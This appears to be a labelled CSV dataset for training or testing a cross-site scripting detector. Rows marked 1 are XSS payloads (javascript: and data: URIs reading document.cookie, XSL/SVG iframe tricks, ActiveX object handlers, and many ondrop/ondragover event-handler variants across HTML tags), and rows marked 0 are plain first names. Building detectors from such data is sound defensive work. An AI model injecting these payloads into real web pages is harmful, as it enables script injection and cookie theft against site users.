input,label
feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>,1
"feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b>",1
<br/><hr/>feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>,1
"<div id=""dropbox"" style=""height: 360px;width: 500px;border: 5px solid #000;position: relative;"" ondragover=""event.preventDefault()"">+ Drop Box +</div>//[""'`-->]]>]</div>",1
Brad,0
Selina,0
Piggy,0
Elysha,0
Cal,0
Selig,0
Byrann,0
Maryl,0
Lenee,0
Giffy,0
Stormy,0
Irvin,0
Conrad,0
Salim,0
<!DOCTYPE doc [,1
<!ATTLIST xsl:stylesheet id    ID    #REQUIRED>]>,1
"<svg xmlns=""http://www.w3.org/2000/svg"">",1
"<xsl:stylesheet id=""stylesheet"" version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">        <xsl:template match=""/""><iframe xmlns=""http://www.w3.org/1999/xhtml"" src=""javascript:alert(125)""></iframe>        </xsl:template></xsl:stylesheet><circle fill=""red"" r=""40""></circle></svg>//[""'`-->]]>]</div>",1
"<div id=""126""><object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object>",1
"<object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""alert(126)"" style=""behavior:url(#x);""><param name=postdomevents /></object>//[""'`-->]]>]</div>",1
"<div id=""127""><svg xmlns=""http://www.w3.org/2000/svg"" id=""x"">",1
"<listener event=""load"" handler=""#y"" xmlns=""http://www.w3.org/2001/xml-events"" observer=""x""/>",1
"<handler id=""y"">alert(127)</handler>",1
"<div id=""128""><svg><style>&lt;img/src=x onerror=alert(128)// </b>//[""'`-->]]>]</div>",1
"<div id=""129""><svg>",1
Winni,0
Verla,0
Eydie,0
Lazaro,0
Hettie,0
Elianore,0
Jacklin,0
Danita,0
Geri,0
Gavan,0
Candace,0
Alphonse,0
"<div draggable=""true"" contenteditable>drag me</div><dir ondrop=alert(1) contenteditable>drop here</dir>",1
"<div draggable=""true"" contenteditable>drag me</div><div ondragover=alert(1) contenteditable>drop here</div>",1
"<div draggable=""true"" contenteditable>drag me</div><div ondrop=alert(1) contenteditable>drop here</div>",1
"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",1
"<div draggable=""true"" contenteditable>drag me</div><dl ondrop=alert(1) contenteditable>drop here</dl>",1
"<div draggable=""true"" contenteditable>drag me</div><dt ondragover=alert(1) contenteditable>drop here</dt>",1
"<div draggable=""true"" contenteditable>drag me</div><dt ondrop=alert(1) contenteditable>drop here</dt>",1
"<div draggable=""true"" contenteditable>drag me</div><element ondragover=alert(1) contenteditable>drop here</element>",1
"<div draggable=""true"" contenteditable>drag me</div><element ondrop=alert(1) contenteditable>drop here</element>",1
"<div draggable=""true"" contenteditable>drag me</div><em ondragover=alert(1) contenteditable>drop here</em>",1
"<div draggable=""true"" contenteditable>drag me</div><em ondrop=alert(1) contenteditable>drop here</em>",1
"<div draggable=""true"" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>",1
"<div draggable=""true"" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>",1
"<div draggable=""true"" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable>drop here</fieldset>",1
"<div draggable=""true"" contenteditable>drag me</div><fieldset ondrop=alert(1) contenteditable>drop here</fieldset>",1
"<div draggable=""true"" contenteditable>drag me</div><figcaption ondragover=alert(1) contenteditable>drop here</figcaption>",1
"<div draggable=""true"" contenteditable>drag me</div><figcaption ondrop=alert(1) contenteditable>drop here</figcaption>",1
"<div draggable=""true"" contenteditable>drag me</div><figure ondragover=alert(1) contenteditable>drop here</figure>",1
"<div draggable=""true"" contenteditable>drag me</div><figure ondrop=alert(1) contenteditable>drop here</figure>",1
"<div draggable=""true"" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>",1
"<div draggable=""true"" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>",1
"<div draggable=""true"" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>",1
"<div draggable=""true"" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable>drop here</footer>",1
"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>",1
"<div draggable=""true"" contenteditable>drag me</div><form ondrop=alert(1) contenteditable>drop here</form>",1
"<div draggable=""true"" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable>drop here</frame>",1
"<div draggable=""true"" contenteditable>drag me</div><frame ondrop=alert(1) contenteditable>drop here</frame>",1
"<div draggable=""true"" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable>drop here</frameset>",1
"<div draggable=""true"" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable>drop here</frameset>",1
"<div draggable=""true"" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable>drop here</h1>",1
"<div draggable=""true"" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>",1
"<div draggable=""true"" contenteditable>drag me</div><head ondragover=alert(1) contenteditable>drop here</head>",1
"<div draggable=""true"" contenteditable>drag me</div><option ondrop=alert(1) contenteditable>drop here</option>",1
"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>",1
"<div draggable=""true"" contenteditable>drag me</div><output ondrop=alert(1) contenteditable>drop here</output>",1
"<div draggable=""true"" contenteditable>drag me</div><p ondragover=alert(1) contenteditable>drop here</p>",1
"<div draggable=""true"" contenteditable>drag me</div><p ondrop=alert(1) contenteditable>drop here</p>",1
Murial,0
Jaimie,0
Melly,0
Felipa,0
Merwin,0
Cleveland,0
Kathye,0
Guthrie,0
Madelle,0
Rustin,0
Irv,0
Reyna,0
Ronni,0
Everett,0
Baudoin,0
Louise,0
Sallee,0
Karisa,0
Forrest,0
Candide,0
Isiahi,0
Guido,0
Vittoria,0
Elvyn,0
Cookie,0
Gayle,0
Isis,0
Carly,0
"<div draggable=""true"" contenteditable>drag me</div><head ondrop=alert(1) contenteditable>drop here</head>",1
"<div draggable=""true"" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>",1
"<div draggable=""true"" contenteditable>drag me</div><header ondrop=alert(1) contenteditable>drop here</header>",1
"<div draggable=""true"" contenteditable>drag me</div><hgroup ondragover=alert(1) contenteditable>drop here</hgroup>",1
"<div draggable=""true"" contenteditable>drag me</div><hgroup ondrop=alert(1) contenteditable>drop here</hgroup>",1
"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>",1
"<div draggable=""true"" contenteditable>drag me</div><hr ondrop=alert(1) contenteditable>drop here</hr>",1
"<div draggable=""true"" contenteditable>drag me</div><html ondragover=alert(1) contenteditable>drop here</html>",1
"<div draggable=""true"" contenteditable>drag me</div><html ondrop=alert(1) contenteditable>drop here</html>",1
"<div draggable=""true"" contenteditable>drag me</div><i ondragover=alert(1) contenteditable>drop here</i>",1
"<div draggable=""true"" contenteditable>drag me</div><i ondrop=alert(1) contenteditable>drop here</i>",1
"<div draggable=""true"" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>",1
"<div draggable=""true"" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>",1
"<div draggable=""true"" contenteditable>drag me</div><li ondrop=alert(1) contenteditable>drop here</li>",1
"<div draggable=""true"" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>",1
"<div draggable=""true"" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>",1
"<div draggable=""true"" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable>drop here</listing>",1
"<div draggable=""true"" contenteditable>drag me</div><listing ondrop=alert(1) contenteditable>drop here</listing>",1
"<div draggable=""true"" contenteditable>drag me</div><main ondragover=alert(1) contenteditable>drop here</main>",1
"<div draggable=""true"" contenteditable>drag me</div><main ondrop=alert(1) contenteditable>drop here</main>",1
"<div draggable=""true"" contenteditable>drag me</div><map ondragover=alert(1) contenteditable>drop here</map>",1
"<div draggable=""true"" contenteditable>drag me</div><map ondrop=alert(1) contenteditable>drop here</map>",1
"<div draggable=""true"" contenteditable>drag me</div><mark ondragover=alert(1) contenteditable>drop here</mark>",1
"<div draggable=""true"" contenteditable>drag me</div><mark ondrop=alert(1) contenteditable>drop here</mark>",1
"<div draggable=""true"" contenteditable>drag me</div><marquee ondragover=alert(1) contenteditable>drop here</marquee>",1
"<div draggable=""true"" contenteditable>drag me</div><marquee ondrop=alert(1) contenteditable>drop here</marquee>",1
"<div draggable=""true"" contenteditable>drag me</div><menu ondragover=alert(1) contenteditable>drop here</menu>",1
"<div draggable=""true"" contenteditable>drag me</div><menu ondrop=alert(1) contenteditable>drop here</menu>",1
"<div draggable=""true"" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable>drop here</menuitem>",1
"<div draggable=""true"" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>",1
"<div draggable=""true"" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable>drop here</meta>",1
"<div draggable=""true"" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable>drop here</meta>",1
"<div draggable=""true"" contenteditable>drag me</div><meter ondragover=alert(1) contenteditable>drop here</meter>",1
"<div draggable=""true"" contenteditable>drag me</div><meter ondrop=alert(1) contenteditable>drop here</meter>",1
"<div draggable=""true"" contenteditable>drag me</div><multicol ondragover=alert(1) contenteditable>drop here</multicol>",1
"<div draggable=""true"" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>",1
"<div draggable=""true"" contenteditable>drag me</div><nav ondragover=alert(1) contenteditable>drop here</nav>",1
"<div draggable=""true"" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable>drop here</nav>",1
